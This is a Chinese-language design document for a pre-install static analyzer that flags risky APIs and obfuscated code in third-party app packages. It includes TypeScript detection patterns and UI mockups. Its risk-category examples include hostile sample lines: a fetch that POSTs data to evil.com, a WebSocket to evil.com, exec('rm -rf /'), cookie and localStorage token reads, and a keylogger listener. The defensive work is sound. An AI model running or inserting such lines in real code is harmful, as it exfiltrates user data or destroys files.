# App 代码静态分析设计

> 通过静态分析审查外部 App 的代码，识别高风险 API 使用，让用户知情决策

## 目录

1. [设计目标](#设计目标)
2. [分析范围](#分析范围)
3. [风险分类](#风险分类)
4. [混淆代码检测](#混淆代码检测)
5. [实现方案](#实现方案)
6. [用户界面](#用户界面)
7. [实现计划](#实现计划)

---

## 设计目标

### 核心理念

**"无法阻止，但可以告知"**

由于 JavaScript 的动态特性，我们无法完全阻止恶意代码的执行。但我们可以：

1. **静态分析**：在安装前扫描代码，识别高风险 API
2. **风险报告**：向用户清晰展示发现的风险
3. **知情同意**：让用户在了解风险后做出决策

### 设计原则

| 原则 | 说明 |
|------|------|
| **透明性** | 用户能看到 App 使用了哪些能力 |
| **白名单制** | 只有白名单内的 API 才是"安全"的 |
| **分级警告** | 不同风险级别给予不同程度的警告 |
| **可选安装** | 高风险 App 需要用户明确确认 |

---

## 分析范围

### 当前 App 类型

```typescript
export type AppType = 'configurable' | 'template' | 'composite'
```

| 类型 | 代码载体 | 分析重点 |
|------|----------|----------|
| `configurable` | JSON 配置 | `dataSource.apiConfig.url` |
| `template` | HTML 模板 + CSS | `<script>` 标签、内联事件 |
| `composite` | 组件配置 | 动作处理器、表达式 |

### 未来可能支持

| 类型 | 代码载体 | 风险等级 |
|------|----------|----------|
| `script` | 自定义 JS 代码 | 🔴 最高 |
| `iframe` | 嵌入外部页面 | 🔴 最高 |
| `wasm` | WebAssembly 模块 | 🔴 最高 |

---

## 风险分类

### 浏览器环境危险 API

```typescript
export interface RiskCategory {
  id: string
  name: string
  level: 'critical' | 'high' | 'medium' | 'low' | 'info'
  description: string
  patterns: RegExp[]
  examples: string[]
}

export const RISK_CATEGORIES: RiskCategory[] = [
  // ==================== 🔴 严重风险 ====================
  {
    id: 'dynamic-code-execution',
    name: '动态代码执行',
    level: 'critical',
    description: '可以执行任意代码，绕过所有安全检查',
    patterns: [
      /\beval\s*\(/,
      /\bnew\s+Function\s*\(/,
      /\bsetTimeout\s*\(\s*['"`]/,  // setTimeout("code")
      /\bsetInterval\s*\(\s*['"`]/,
      /\.innerHTML\s*=/,
      /\.outerHTML\s*=/,
      /document\.write\s*\(/,
      /\.insertAdjacentHTML\s*\(/,
    ],
    examples: [
      'eval(userInput)',
      'new Function("return " + code)()',
      'element.innerHTML = htmlString',
    ]
  },
  {
    id: 'prototype-pollution',
    name: '原型链操作',
    level: 'critical',
    description: '可能污染全局对象原型链',
    patterns: [
      /Object\.prototype/,
      /Array\.prototype/,
      /Function\.prototype/,
      /__proto__/,
      /Object\.defineProperty/,
      /Object\.setPrototypeOf/,
      /Reflect\.setPrototypeOf/,
    ],
    examples: [
      'Object.prototype.polluted = true',
      'obj.__proto__.hack = fn',
    ]
  },
  
  // ==================== 🟠 高风险 ====================
  {
    id: 'network-access',
    name: '网络请求',
    level: 'high',
    description: '可以向外部服务器发送数据',
    patterns: [
      /\bfetch\s*\(/,
      /\bnew\s+XMLHttpRequest/,
      /\.open\s*\(\s*['"`](GET|POST|PUT|DELETE)/i,
      /\bnew\s+WebSocket\s*\(/,
      /\bnew\s+EventSource\s*\(/,
      /navigator\.sendBeacon\s*\(/,
      /\baxios/,
      /\$\.ajax/,
      /\$\.get/,
      /\$\.post/,
    ],
    examples: [
      'fetch("https://evil.com/collect", { method: "POST", body: data })',
      'new WebSocket("wss://evil.com")',
    ]
  },
  {
    id: 'storage-access',
    name: '本地存储访问',
    level: 'high',
    description: '可以读写浏览器存储的数据',
    patterns: [
      /\blocalStorage/,
      /\bsessionStorage/,
      /\bindexedDB/,
      /\bopenDatabase/,
      /\bcaches\./,
      /document\.cookie/,
    ],
    examples: [
      'localStorage.getItem("token")',
      'document.cookie',
    ]
  },
  {
    id: 'dom-manipulation',
    name: 'DOM 操作',
    level: 'high',
    description: '可以修改页面结构，可能进行 UI 欺骗',
    patterns: [
      /document\.createElement/,
      /document\.body/,
      /document\.head/,
      /document\.getElementById/,
      /document\.querySelector/,
      /\.appendChild\s*\(/,
      /\.removeChild\s*\(/,
      /\.replaceChild\s*\(/,
      /\.cloneNode\s*\(/,
    ],
    examples: [
      'document.body.appendChild(fakeLoginForm)',
      'document.querySelector(".password").value',
    ]
  },
  
  // ==================== 🟡 中等风险 ====================
  {
    id: 'user-interaction',
    name: '用户交互拦截',
    level: 'medium',
    description: '可以监听用户输入',
    patterns: [
      /\.addEventListener\s*\(\s*['"`](keydown|keyup|keypress)/,
      /\.addEventListener\s*\(\s*['"`](input|change)/,
      /\.addEventListener\s*\(\s*['"`](click|mousedown|mouseup)/,
      /\.onkeydown/,
      /\.onkeyup/,
      /\.oninput/,
    ],
    examples: [
      'document.addEventListener("keydown", keylogger)',
    ]
  },
  {
    id: 'clipboard-access',
    name: '剪贴板访问',
    level: 'medium',
    description: '可以读写剪贴板内容',
    patterns: [
      /navigator\.clipboard/,
      /document\.execCommand\s*\(\s*['"`](copy|cut|paste)/,
    ],
    examples: [
      'navigator.clipboard.readText()',
      'navigator.clipboard.writeText(maliciousUrl)',
    ]
  },
  {
    id: 'location-access',
    name: '位置和导航',
    level: 'medium',
    description: '可以获取/修改页面 URL 或进行重定向',
    patterns: [
      /\blocation\.href/,
      /\blocation\.replace/,
      /\blocation\.assign/,
      /\bwindow\.open\s*\(/,
      /\bhistory\.pushState/,
      /\bhistory\.replaceState/,
    ],
    examples: [
      'location.href = "https://phishing.com"',
      'window.open("https://ads.com")',
    ]
  },
  {
    id: 'timer-abuse',
    name: '定时器',
    level: 'medium',
    description: '可能用于挖矿或持续后台活动',
    patterns: [
      /\bsetInterval\s*\(/,
      /\brequestAnimationFrame\s*\(/,
      /\brequestIdleCallback\s*\(/,
    ],
    examples: [
      'setInterval(cryptoMiner, 100)',
    ]
  },
  
  // ==================== 🟢 低风险 / 信息 ====================
  {
    id: 'browser-info',
    name: '浏览器信息',
    level: 'low',
    description: '可以获取浏览器和设备信息',
    patterns: [
      /\bnavigator\.userAgent/,
      /\bnavigator\.platform/,
      /\bnavigator\.language/,
      /\bscreen\.width/,
      /\bscreen\.height/,
      /\bdevicePixelRatio/,
    ],
    examples: [
      'navigator.userAgent',
    ]
  },
  {
    id: 'console-output',
    name: '控制台输出',
    level: 'info',
    description: '向控制台输出信息',
    patterns: [
      /\bconsole\.(log|warn|error|info|debug)/,
    ],
    examples: [
      'console.log("debug info")',
    ]
  },
]
```

### Node.js 环境 API（Web 中不可用但应警告）

```typescript
export const NODEJS_RISK_PATTERNS: RiskCategory[] = [
  {
    id: 'nodejs-fs',
    name: 'Node.js 文件系统',
    level: 'critical',
    description: '尝试访问文件系统（在浏览器中不可用）',
    patterns: [
      /require\s*\(\s*['"`]fs['"`]\)/,
      /require\s*\(\s*['"`]fs\/promises['"`]\)/,
      /from\s+['"`]fs['"`]/,
      /from\s+['"`]node:fs['"`]/,
      /\bfs\.(readFile|writeFile|unlink|rmdir)/,
    ],
    examples: [
      'const fs = require("fs")',
      'import fs from "node:fs"',
    ]
  },
  {
    id: 'nodejs-http',
    name: 'Node.js HTTP 模块',
    level: 'high',
    description: '尝试使用 Node.js HTTP（在浏览器中不可用）',
    patterns: [
      /require\s*\(\s*['"`]http['"`]\)/,
      /require\s*\(\s*['"`]https['"`]\)/,
      /require\s*\(\s*['"`]net['"`]\)/,
      /from\s+['"`](http|https|net)['"`]/,
    ],
    examples: [
      'const http = require("http")',
    ]
  },
  {
    id: 'nodejs-child-process',
    name: 'Node.js 子进程',
    level: 'critical',
    description: '尝试执行系统命令（在浏览器中不可用）',
    patterns: [
      /require\s*\(\s*['"`]child_process['"`]\)/,
      /from\s+['"`]child_process['"`]/,
      /\bexec\s*\(/,
      /\bspawn\s*\(/,
      /\bexecSync\s*\(/,
    ],
    examples: [
      'const { exec } = require("child_process")',
      'exec("rm -rf /")',
    ]
  },
  {
    id: 'nodejs-process',
    name: 'Node.js 进程访问',
    level: 'high',
    description: '尝试访问进程信息（在浏览器中不可用）',
    patterns: [
      /\bprocess\.env/,
      /\bprocess\.exit/,
      /\bprocess\.cwd/,
      /\bprocess\.argv/,
    ],
    examples: [
      'process.env.SECRET_KEY',
    ]
  },
]
```

### 安全的白名单 API

```typescript
export const SAFE_APIS = [
  // Vue 相关
  'ref', 'reactive', 'computed', 'watch', 'onMounted', 'onUnmounted',
  'defineProps', 'defineEmits', 'defineExpose',
  
  // 基础 JS
  'Array', 'Object', 'String', 'Number', 'Boolean', 'Date', 'Math', 'JSON',
  'Map', 'Set', 'WeakMap', 'WeakSet', 'Symbol',
  'Promise', 'async', 'await',
  
  // 我们提供的安全 API
  'useAppRuntime', 'useAppStorage', 'useContactsAPI',
]
```

---

## 混淆代码检测

### 为什么要检测混淆代码

```
┌─────────────────────────────────────────────────────────────────┐
│  场景分析                                                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  我们的 App 格式:                                                 │
│  ├── configurable: 纯 JSON 配置 → 不可能混淆                      │
│  ├── template: HTML + 少量内联 JS → 没必要混淆                    │
│  └── composite: 组件配置 → 不可能混淆                             │
│                                                                   │
│  如果有人混淆了代码，说明:                                        │
│  ├── 要么是恶意的，想隐藏真实意图                                 │
│  └── 要么是从别处复制粘贴了压缩过的第三方库                       │
│                                                                   │
│  结论: 在我们的场景下，混淆代码本身就是可疑行为                    │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 混淆检测指标

```typescript
// src/services/codeAnalysis/obfuscationDetector.ts

export interface ObfuscationIndicator {
  id: string
  name: string
  weight: number  // 权重，用于综合评分
  detect: (code: string) => { matched: boolean; evidence?: string }
}

export const OBFUSCATION_INDICATORS: ObfuscationIndicator[] = [
  {
    id: 'hex-variable-names',
    name: '十六进制变量名',
    weight: 3,
    detect: (code) => {
      // _0x1a2b, _0xabc123
      const matches = code.match(/_0x[a-f0-9]{4,}/gi)
      return {
        matched: (matches?.length ?? 0) > 3,
        evidence: matches?.slice(0, 3).join(', ')
      }
    }
  },
  {
    id: 'unicode-escapes',
    name: 'Unicode 转义序列',
    weight: 4,
    detect: (code) => {
      // \u0065\u0076\u0061\u006c = "eval"
      const matches = code.match(/\\u[0-9a-f]{4}/gi)
      return {
        matched: (matches?.length ?? 0) > 10,
        evidence: `发现 ${matches?.length} 处 Unicode 转义`
      }
    }
  },
  {
    id: 'base64-execution',
    name: 'Base64 解码执行',
    weight: 5,
    detect: (code) => {
      // atob("ZXZhbA==") 或 eval(atob(...))
      const pattern = /(atob|btoa)\s*\([^)]+\)|eval\s*\(\s*(atob|Buffer)/i
      const match = code.match(pattern)
      return {
        matched: !!match,
        evidence: match?.[0]
      }
    }
  },
  {
    id: 'long-single-line',
    name: '超长单行代码',
    weight: 2,
    detect: (code) => {
      const lines = code.split('\n')
      const longLines = lines.filter(l => l.length > 500)
      return {
        matched: longLines.length > 0,
        evidence: `${longLines.length} 行超过 500 字符`
      }
    }
  },
  {
    id: 'high-entropy',
    name: '高熵值（加密特征）',
    weight: 3,
    detect: (code) => {
      const entropy = calculateEntropy(code)
      return {
        matched: entropy > 5.5,  // 正常代码通常 4-5
        evidence: `熵值: ${entropy.toFixed(2)}`
      }
    }
  },
  {
    id: 'array-string-mapping',
    name: '字符串数组映射',
    weight: 4,
    detect: (code) => {
      // var _0x1234 = ["eval", "apply", ...]; _0x1234[0]
      const pattern = /\[\s*["'][^"']+["']\s*(,\s*["'][^"']+["']\s*){10,}\]/
      return {
        matched: pattern.test(code),
        evidence: '检测到字符串数组混淆模式'
      }
    }
  },
  {
    id: 'meaningless-names',
    name: '无意义短变量名密集',
    weight: 2,
    detect: (code) => {
      // 统计单字母变量使用频率
      const singleLetterVars = code.match(/\b[a-z]\s*[=\(,\)]/gi)
      const ratio = (singleLetterVars?.length ?? 0) / code.length
      return {
        matched: ratio > 0.02,  // 超过 2% 的字符是单字母变量
        evidence: `单字母变量密度: ${(ratio * 100).toFixed(1)}%`
      }
    }
  },
]

/**
 * 计算字符串熵值
 * 熵值越高，说明字符分布越随机（可能是加密或混淆）
 */
function calculateEntropy(str: string): number {
  const freq: Record<string, number> = {}
  for (const char of str) {
    freq[char] = (freq[char] || 0) + 1
  }
  
  let entropy = 0
  const len = str.length
  for (const count of Object.values(freq)) {
    const p = count / len
    entropy -= p * Math.log2(p)
  }
  return entropy
}
```

### 混淆检测结果类型

```typescript
/** 混淆检测发现 */
export interface ObfuscationFinding {
  indicatorId: string
  indicatorName: string
  evidence?: string
  weight: number
}

/** 混淆检测结果 */
export interface ObfuscationResult {
  /** 是否被判定为混淆代码 */
  isObfuscated: boolean
  
  /** 置信度 (0-1) */
  confidence: number
  
  /** 检测到的指标 */
  findings: ObfuscationFinding[]
  
  /** 建议处理方式 */
  recommendation: 'allowed' | 'blocked'
}
```

### 检测实现

```typescript
/**
 * 检测代码是否被混淆
 */
export function detectObfuscation(code: string): ObfuscationResult {
  const findings: ObfuscationFinding[] = []
  let totalWeight = 0
  
  for (const indicator of OBFUSCATION_INDICATORS) {
    const result = indicator.detect(code)
    if (result.matched) {
      findings.push({
        indicatorId: indicator.id,
        indicatorName: indicator.name,
        evidence: result.evidence,
        weight: indicator.weight,
      })
      totalWeight += indicator.weight
    }
  }
  
  // 根据总权重判断
  const isObfuscated = totalWeight >= 5  // 阈值可调
  const confidence = Math.min(totalWeight / 10, 1)  // 0-1 的置信度
  
  return {
    isObfuscated,
    confidence,
    findings,
    recommendation: isObfuscated ? 'blocked' : 'allowed'
  }
}

/**
 * 在分析流程中集成混淆检测
 */
export function analyzeAppPackageWithObfuscationCheck(
  pkg: PhoneAppPackage
): AnalysisReportExtended {
  // 1. 提取代码
  const segments = extractCodeSegments(pkg)
  const allCode = segments.map(s => s.content).join('\n')
  
  // 2. 混淆检测
  const obfuscation = detectObfuscation(allCode)
  
  // 3. 常规风险分析
  const baseReport = analyzeAppPackage(pkg)
  
  // 4. 合并结果
  return {
    ...baseReport,
    obfuscation,
    // 如果检测到混淆，提升阻止级别
    blockInstall: baseReport.blockInstall || obfuscation.isObfuscated,
    blockReason: obfuscation.isObfuscated 
      ? '检测到混淆代码，无法进行安全分析'
      : baseReport.blockReason,
  }
}
```

### 混淆代码处理策略

| 策略 | 做法 |
|------|------|
| **检测** | 多指标综合判断，降低误报 |
| **默认行为** | 阻止安装，但不是"强制拒绝" |
| **用户选择** | 允许手动覆盖，但增加摩擦（输入确认文字） |
| **记录** | 标记该 App 为"用户强制安装"，后续可追溯 |

### 混淆代码用户界面

```
┌─────────────────────────────────────────────────────────────────┐
│  🚨 检测到混淆代码                                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  ⚠️ 该应用的代码经过混淆处理，无法进行安全分析               │ │
│  │                                                              │ │
│  │  混淆代码的常见目的:                                         │ │
│  │  • 隐藏恶意行为（如窃取数据、挖矿）                          │ │
│  │  • 绕过安全检查                                              │ │
│  │  • 保护商业代码（但我们的 App 格式不需要这样做）              │ │
│  │                                                              │ │
│  │  检测到的特征:                                               │ │
│  │  • ✗ 十六进制变量名 (_0x1a2b, _0x3c4d, ...)                 │ │
│  │  • ✗ Base64 解码执行                                        │ │
│  │  • ✗ 超长单行代码 (3 行超过 500 字符)                        │ │
│  │                                                              │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  系统已阻止安装此应用。                                           │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │  ▶ 我了解风险，仍要安装（不推荐）                            │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│                                            [取消]                 │
└─────────────────────────────────────────────────────────────────┘
```

展开"仍要安装"后的强制确认：

```
┌─────────────────────────────────────────────────────────────────┐
│  ⚠️ 强制安装确认                                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  请输入 "我了解风险" 以继续:                                       │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │                                                              │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  ⚠️ 强制安装的应用将被标记为"用户自行承担风险"                    │
│                                                                   │
│  [取消]                                        [强制安装]         │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 扩展类型定义

```typescript
/** 扩展的分析报告（包含混淆检测） */
export interface AnalysisReportExtended extends AnalysisReport {
  /** 混淆检测结果 */
  obfuscation: ObfuscationResult
}

/** 扩展 InstalledAppExtended 记录强制安装信息 */
export interface InstalledAppExtended {
  // ... 现有字段 ...
  
  /** 安全分析报告 */
  securityReport?: AnalysisReportExtended
  
  /** 是否由用户强制安装（忽略安全警告） */
  forcedInstall?: boolean
  
  /** 强制安装时间 */
  forcedInstallAt?: number
}
```

---

## 实现方案

### 分析器架构

```
┌─────────────────────────────────────────────────────────────────┐
│                     代码分析流程                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. 输入                                                          │
│     ┌────────────────────────────────────────────────────────┐  │
│     │  PhoneAppPackage (JSON)                                 │  │
│     │  ├── template?.template (HTML 字符串)                   │  │
│     │  ├── template?.styles (CSS 字符串)                      │  │
│     │  ├── composite?.actions (动作配置)                      │  │
│     │  └── dataSource?.apiConfig?.url (外部 URL)              │  │
│     └────────────────────────────────────────────────────────┘  │
│                          ↓                                        │
│  2. 代码提取                                                      │
│     ┌────────────────────────────────────────────────────────┐  │
│     │  extractCodeSegments(pkg) → CodeSegment[]               │  │
│     │  ├── 提取 <script> 标签内容                              │  │
│     │  ├── 提取内联事件处理器 (onclick, onload 等)             │  │
│     │  ├── 提取 style 中的 url() 和 @import                   │  │
│     │  └── 提取动作表达式                                      │  │
│     └────────────────────────────────────────────────────────┘  │
│                          ↓                                        │
│  3. 模式匹配                                                      │
│     ┌────────────────────────────────────────────────────────┐  │
│     │  analyzeCode(segments) → RiskMatch[]                    │  │
│     │  ├── 遍历 RISK_CATEGORIES                                │  │
│     │  ├── 对每个 segment 应用正则匹配                         │  │
│     │  └── 记录匹配位置和上下文                                 │  │
│     └────────────────────────────────────────────────────────┘  │
│                          ↓                                        │
│  4. 风险报告生成                                                  │
│     ┌────────────────────────────────────────────────────────┐  │
│     │  generateReport(matches) → AnalysisReport               │  │
│     │  ├── 按风险级别分组                                      │  │
│     │  ├── 生成摘要统计                                        │  │
│     │  └── 生成用户友好的说明                                  │  │
│     └────────────────────────────────────────────────────────┘  │
│                          ↓                                        │
│  5. 输出                                                          │
│     ┌────────────────────────────────────────────────────────┐  │
│     │  AnalysisReport                                         │  │
│     │  ├── summary: { critical, high, medium, low, info }     │  │
│     │  ├── risks: RiskMatch[]                                 │  │
│     │  ├── externalUrls: string[]                             │  │
│     │  └── recommendation: 'safe' | 'caution' | 'danger'      │  │
│     └────────────────────────────────────────────────────────┘  │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 类型定义

```typescript
// src/services/codeAnalysis/types.ts

/** 代码片段 */
export interface CodeSegment {
  /** 片段类型 */
  type: 'script' | 'inline-event' | 'style-url' | 'action-expr' | 'api-url'
  /** 代码内容 */
  content: string
  /** 来源位置描述 */
  location: string
  /** 原始行号（如果可用） */
  line?: number
}

/** 风险匹配结果 */
export interface RiskMatch {
  /** 风险类别 ID */
  categoryId: string
  /** 风险类别名称 */
  categoryName: string
  /** 风险级别 */
  level: 'critical' | 'high' | 'medium' | 'low' | 'info'
  /** 匹配到的代码片段 */
  matchedCode: string
  /** 代码上下文（前后各 20 字符） */
  context: string
  /** 来源位置 */
  location: string
  /** 风险说明 */
  description: string
}

/** 分析报告 */
export interface AnalysisReport {
  /** 分析时间 */
  analyzedAt: number
  
  /** 风险统计 */
  summary: {
    critical: number
    high: number
    medium: number
    low: number
    info: number
    total: number
  }
  
  /** 详细风险列表 */
  risks: RiskMatch[]
  
  /** 发现的外部 URL */
  externalUrls: Array<{
    url: string
    location: string
    type: 'api' | 'resource' | 'link'
  }>
  
  /** 总体建议 */
  recommendation: 'safe' | 'caution' | 'danger'
  
  /** 建议说明 */
  recommendationText: string
  
  /** 是否阻止安装 */
  blockInstall: boolean
  
  /** 阻止原因 */
  blockReason?: string
}
```

### 分析器实现

```typescript
// src/services/codeAnalysis/analyzer.ts

import type { PhoneAppPackage } from '@/types/appPackage'
import type { CodeSegment, RiskMatch, AnalysisReport } from './types'
import { RISK_CATEGORIES, NODEJS_RISK_PATTERNS } from './riskPatterns'

/**
 * 从 App 包中提取代码片段
 */
export function extractCodeSegments(pkg: PhoneAppPackage): CodeSegment[] {
  const segments: CodeSegment[] = []
  
  // 1. 提取 template 中的代码
  if (pkg.template?.template) {
    // 提取 <script> 标签
    const scriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi
    let match
    while ((match = scriptRegex.exec(pkg.template.template)) !== null) {
      segments.push({
        type: 'script',
        content: match[1],
        location: 'template > <script>',
      })
    }
    
    // 提取内联事件处理器
    const eventRegex = /\s(on\w+)=["']([^"']*)["']/gi
    while ((match = eventRegex.exec(pkg.template.template)) !== null) {
      segments.push({
        type: 'inline-event',
        content: match[2],
        location: `template > ${match[1]} handler`,
      })
    }
    
    // 提取 href="javascript:..."
    const jsHrefRegex = /href=["']javascript:([^"']*)["']/gi
    while ((match = jsHrefRegex.exec(pkg.template.template)) !== null) {
      segments.push({
        type: 'inline-event',
        content: match[1],
        location: 'template > javascript: href',
      })
    }
  }
  
  // 2. 提取样式中的 URL
  if (pkg.template?.styles) {
    const urlRegex = /url\s*\(["']?([^)"']+)["']?\)/gi
    let match
    while ((match = urlRegex.exec(pkg.template.styles)) !== null) {
      segments.push({
        type: 'style-url',
        content: match[1],
        location: 'styles > url()',
      })
    }
    
    // @import
    const importRegex = /@import\s+["']([^"']+)["']/gi
    while ((match = importRegex.exec(pkg.template.styles)) !== null) {
      segments.push({
        type: 'style-url',
        content: match[1],
        location: 'styles > @import',
      })
    }
  }
  
  // 3. 提取 dataSource 的 API URL
  if (pkg.dataSource?.apiConfig?.url) {
    segments.push({
      type: 'api-url',
      content: pkg.dataSource.apiConfig.url,
      location: 'dataSource > apiConfig > url',
    })
  }
  
  // 4. 提取 composite actions 中的表达式
  if (pkg.composite?.actions) {
    for (const [name, action] of Object.entries(pkg.composite.actions)) {
      if (action.value !== undefined) {
        segments.push({
          type: 'action-expr',
          content: String(action.value),
          location: `composite > actions > ${name}`,
        })
      }
    }
  }
  
  // 5. 提取 AI 命令中的动作
  if (pkg.aiCommands) {
    for (const cmd of pkg.aiCommands) {
      if (cmd.action.type === 'updateState') {
        segments.push({
          type: 'action-expr',
          content: JSON.stringify(cmd.action.updates),
          location: `aiCommands > ${cmd.type} > updateState`,
        })
      }
    }
  }
  
  return segments
}

/**
 * 分析代码片段中的风险
 */
export function analyzeCode(segments: CodeSegment[]): RiskMatch[] {
  const matches: RiskMatch[] = []
  const allPatterns = [...RISK_CATEGORIES, ...NODEJS_RISK_PATTERNS]
  
  for (const segment of segments) {
    for (const category of allPatterns) {
      for (const pattern of category.patterns) {
        // 重置正则状态
        pattern.lastIndex = 0
        
        let match
        while ((match = pattern.exec(segment.content)) !== null) {
          // 获取上下文
          const start = Math.max(0, match.index - 20)
          const end = Math.min(segment.content.length, match.index + match[0].length + 20)
          const context = segment.content.substring(start, end)
          
          matches.push({
            categoryId: category.id,
            categoryName: category.name,
            level: category.level,
            matchedCode: match[0],
            context: context,
            location: segment.location,
            description: category.description,
          })
        }
      }
    }
  }
  
  // 去重（同一位置的相同风险只保留一个）
  return deduplicateMatches(matches)
}

/**
 * 提取外部 URL
 */
export function extractExternalUrls(segments: CodeSegment[]): AnalysisReport['externalUrls'] {
  const urls: AnalysisReport['externalUrls'] = []
  const urlRegex = /https?:\/\/[^\s"'<>)]+/gi
  
  for (const segment of segments) {
    let match
    while ((match = urlRegex.exec(segment.content)) !== null) {
      const url = match[0]
      
      // 判断 URL 类型
      let type: 'api' | 'resource' | 'link' = 'link'
      if (segment.type === 'api-url') {
        type = 'api'
      } else if (segment.type === 'style-url' || /\.(js|css|png|jpg|gif|svg|woff|ttf)$/i.test(url)) {
        type = 'resource'
      }
      
      urls.push({
        url,
        location: segment.location,
        type,
      })
    }
  }
  
  return urls
}

/**
 * 生成分析报告
 */
export function analyzeAppPackage(pkg: PhoneAppPackage): AnalysisReport {
  // 1. 提取代码
  const segments = extractCodeSegments(pkg)
  
  // 2. 分析风险
  const risks = analyzeCode(segments)
  
  // 3. 提取 URL
  const externalUrls = extractExternalUrls(segments)
  
  // 4. 统计
  const summary = {
    critical: risks.filter(r => r.level === 'critical').length,
    high: risks.filter(r => r.level === 'high').length,
    medium: risks.filter(r => r.level === 'medium').length,
    low: risks.filter(r => r.level === 'low').length,
    info: risks.filter(r => r.level === 'info').length,
    total: risks.length,
  }
  
  // 5. 生成建议
  let recommendation: AnalysisReport['recommendation']
  let recommendationText: string
  let blockInstall = false
  let blockReason: string | undefined
  
  if (summary.critical > 0) {
    recommendation = 'danger'
    recommendationText = `发现 ${summary.critical} 个严重风险！该应用可能执行任意代码或访问敏感资源。强烈建议不要安装。`
    // 对于严重风险，考虑阻止安装（可配置）
    if (risks.some(r => r.categoryId === 'dynamic-code-execution' || r.categoryId === 'nodejs-child-process')) {
      blockInstall = true
      blockReason = '检测到动态代码执行或系统命令执行尝试'
    }
  } else if (summary.high > 0) {
    recommendation = 'caution'
    recommendationText = `发现 ${summary.high} 个高风险项。该应用可能进行网络请求或访问本地存储。请确认您信任此应用来源。`
  } else if (summary.medium > 0) {
    recommendation = 'caution'
    recommendationText = `发现 ${summary.medium} 个中等风险项。建议检查应用的具体用途。`
  } else {
    recommendation = 'safe'
    recommendationText = '未发现明显风险。该应用使用的 API 在安全范围内。'
  }
  
  return {
    analyzedAt: Date.now(),
    summary,
    risks,
    externalUrls,
    recommendation,
    recommendationText,
    blockInstall,
    blockReason,
  }
}

/**
 * 去重
 */
function deduplicateMatches(matches: RiskMatch[]): RiskMatch[] {
  const seen = new Set<string>()
  return matches.filter(m => {
    const key = `${m.categoryId}:${m.matchedCode}:${m.location}`
    if (seen.has(key)) return false
    seen.add(key)
    return true
  })
}
```

---

## 用户界面

### 安装前分析报告

```
┌─────────────────────────────────────────────────────────────────┐
│  🔍 安全分析报告                                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  应用: 超级计算器 v1.0.0                                          │
│  来源: https://example.com/app.json                              │
│                                                                   │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  📊 风险统计                                               │  │
│  │                                                            │  │
│  │  🔴 严重  0    🟠 高危  2    🟡 中等  1    🟢 低危  1       │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ⚠️ 建议: 谨慎安装                                                │
│  发现 2 个高风险项。该应用可能进行网络请求或访问本地存储。         │
│                                                                   │
│  ─────────────────────────────────────────────────────────────   │
│                                                                   │
│  🟠 高风险: 网络请求 (2 处)                                       │
│  ├── fetch("https://api.example.com/data")                       │
│  │   位置: template > <script>                                   │
│  │   说明: 可以向外部服务器发送数据                               │
│  │                                                               │
│  └── new WebSocket("wss://ws.example.com")                       │
│      位置: template > <script>                                   │
│      说明: 可以向外部服务器发送数据                               │
│                                                                   │
│  🟡 中等风险: 定时器 (1 处)                                       │
│  └── setInterval(update, 1000)                                   │
│      位置: template > <script>                                   │
│      说明: 可能用于挖矿或持续后台活动                             │
│                                                                   │
│  🟢 低风险: 浏览器信息 (1 处)                                     │
│  └── navigator.userAgent                                         │
│      位置: template > <script>                                   │
│      说明: 可以获取浏览器和设备信息                               │
│                                                                   │
│  ─────────────────────────────────────────────────────────────   │
│                                                                   │
│  🌐 外部连接 (2 个)                                               │
│  ├── https://api.example.com/data (API)                          │
│  └── wss://ws.example.com (WebSocket)                            │
│                                                                   │
│  ─────────────────────────────────────────────────────────────   │
│                                                                   │
│  [取消]                              [我了解风险，继续安装]        │
│                              │
└─────────────────────────────────────────────────────────────────┘
```

### 阻止安装界面

```
┌─────────────────────────────────────────────────────────────────┐
│  🚫 安装已阻止                                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  应用: 恶意工具 v1.0.0                                            │
│  来源: file://malware.json                                       │
│                                                                   │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  🔴 检测到严重安全风险！                                    │  │
│  │                                                            │  │
│  │  该应用包含以下危险代码:                                    │  │
│  │                                                            │  │
│  │  • eval(userInput)                                         │  │
│  │    → 动态代码执行，可运行任意恶意代码                        │  │
│  │                                                            │  │
│  │  • new Function(code)()                                    │  │
│  │    → 动态代码执行，可运行任意恶意代码                        │  │
│  │                                                            │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                   │
│  为保护您的数据安全，系统已阻止安装此应用。                        │
│                                                                   │
│  如果您确信此应用安全，可以在设置中启用"允许安装高风险应用"。     │
│                                                                   │
│                                            [知道了]               │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### 应用详情页显示

```
┌─────────────────────────────────────────────────────────────────┐
│  超级计算器                                                       │
│  v1.0.0 · 已安装                                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  📦 应用信息                                                      │
│  ├── 来源: URL 导入 (TOFU)                                        │
│  ├── 安装时间: 2026-01-06 10:30                                   │
│  └── 信任级别: ⚠️ 未验证                                          │
│                                                                   │
│  🔒 权限                                                          │
│  ├── ✅ 存储 - 已授权                                             │
│  └── ✅ 通知 - 已授权                                             │
│                                                                   │
│  🔍 安全分析                                  [查看详情]           │
│  ├── 🟠 高危: 2                                                   │
│  ├── 🟡 中等: 1                                                   │
│  └── 🟢 低危: 1                                                   │
│                                                                   │
│  🌐 外部连接                                                      │
│  └── api.example.com, ws.example.com                             │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 实现计划

### Phase 1: 分析引擎 (P0)

**预估工时**: 6-8h

```
src/services/codeAnalysis/
├── index.ts                  # 统一导出
